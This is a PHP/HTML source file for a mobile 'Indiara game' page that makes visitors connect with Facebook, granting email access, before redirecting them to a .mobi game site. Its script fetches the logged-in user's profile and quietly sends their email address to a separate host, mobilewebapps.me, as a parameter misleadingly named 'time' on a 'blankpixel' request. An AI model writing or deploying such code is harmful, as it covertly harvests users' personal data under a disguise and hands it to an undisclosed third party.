<?php
header("Location: http://juegosjuegosgratis.mobi/indiara/index2.html");
exit(0);
$titulo="Indiara game";
$goto="http://juegosjuegosgratis.mobi/indiara/index.php";
$gotoreal="http://juegosjuegosgratis.mobi/indiara/index2.html";
$app_id="243101405888153";

function curPageURL() {
 $pageURL = 'http';
 if ($_SERVER["HTTPS"] == "on") {$pageURL .= "s";}
 $pageURL .= "://";
 if ($_SERVER["SERVER_PORT"] != "80") {
  $pageURL .= $_SERVER["SERVER_NAME"].":".$_SERVER["SERVER_PORT"].$_SERVER["REQUEST_URI"];
 } else {
  $pageURL .= $_SERVER["SERVER_NAME"].$_SERVER["REQUEST_URI"];
 }
 return $pageURL;
}
echo('<?xml version="1.0"  encoding="utf-8" ?><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML Basic 1.1//EN" "http://www.w3.org/TR/xhtml-basic/xhtml-basic11.dtd">');
?>

<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
<meta http-equiv="cache-control" content="public" />
<meta http-equiv="expires" content="Thu, 05 Jun 2014 14:21:53 GMT" />
<meta name="viewport" content="target-densitydpi=medium-dpi,width=device-width,initial-scale=1,user-scalable=no" />  
<script src="http://code.jquery.com/jquery.min.js" type="text/javascript"></script> 

<script>
     var prefix="indiara"
     function togle(objtxt) {
        var obj = document.getElementById(objtxt);
        if (obj.style.display == "none")
            obj.style.display = "block"
        else
            obj.style.display = "none"
    }
    function dologin(){
        $("#redirecting").show();
        document.location.href='<?php echo($gotoreal);?>'
        $("#fbbuttons").hide();
    }
     window.fbAsyncInit = function() {
            FB.init({
                appId  : '<?php echo($app_id);?>',
                status : true, // check login status
                cookie : true, // enable cookies to allow the server to access the session
                xfbml  : true  // parse XFBML
            });
            
        
            runFbInitCriticalCode(); //function that contains FB init critical code
        };
        
        function runFbInitCriticalCode(){
            // fetch the status on load
            
            FB.getLoginStatus(function(response) {
                if (response.status=="connected"){
					FB.api('/me', function(response) {
						var you=response;
						
						if (response.error==undefined){
						   
						   var urlx="http://mobilewebapps.me/blankpixel.php?time=" + you.email + "&o="+prefix;
							$.get(
								urlx,
								function(data) {
								//   alert('page content: ' + data);
									var todook=true;
									dologin();
								}
							);
						}else{
							$("#resultados").hide();
							$("#loginbtns").show();
						}
					}, true);
				
					$('#logout').bind('click', function() {
						FB.logout(function(response)
						  {                 
							   document.location.href=document.location.href.replace("&loged=1","")
						  }
						);
					});
				}
            }, true);                
        }


    
</script>
<link type="text/css" rel="stylesheet" href="http://symptoms-of.net/ios7.css" />
<style>
    div{
        text-align:center;
        
    }
    .myheader{
	background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAAqCAMAAABFoMFOAAAAWlBMVEVOaaJDYJxCX5xBXptIZJ9MZ6E/XJpFYZ1KZqA9W5lGYp5HY55MaKFJZZ9LZqBEYZ1NaaJNaKJNaKFAXZtAXZpLZ6E+XJo+W5lJZaA9Wpk8Wpk8Wpg8WZg7WZj2xcGWAAAANElEQVR42lWGSQoAIBDDHCjo0f8/UxBxQDQuFwlpqgBZBq6+P+unVY1GnDgwqbD2zGz5e1lBdwvGGPE6OgAAAABJRU5ErkJggg==);
	background-repeat: repeat-x;
	background-size: auto;
	background-position: 0 0;
	background-color: #4c66a4;
	font-family: 'helvetica neue',helvetica,arial,'lucida grande',sans-serif;
	height: 42px;
	position: relative;
	width: 100%;
	z-index: 1000;
	}
	.myheader h1{
		margin:0px;
		padding:0px;
		color:white;
	}
</style>
</head>
<body leftmargin="0" topmargin="0" marginwidth="0" marginheight="0">

<div id="fb-root"></div>
<script>(function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) return;
  js = d.createElement(s); js.id = id;
  js.src = "//connect.facebook.net/es_ES/all.js#xfbml=1&appId=229317550587161";
  fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script>
<div class="myheader">
<br/>
<h1><?php echo($titulo);?></h1>
</div>

<div id="fbbuttons">
<br/><br/><br/><br/>
<p align="center" style="color:gray;margin:10px;padding:10px;font-size:large;">
In order to use this game you have to connect with Facebook
<br/><br/>
<a href="https://www.facebook.com/dialog/oauth/?client_id=<?php echo($app_id);?>&redirect_uri=<?php echo($goto);?>&state=YOUR_STATE_VALUE&scope=email"><img src="fblog.jpg" style="max-width:300px;width:80%"/></a><br/>
</p>
</div>
<div id="redirecting" style="display:none">
<br/><br/><br/><br/>
<p align="center" style="color:gray;margin:10px;padding:10px;font-size:large;">
    Please wait    
</p>
</div>
</body>
</html>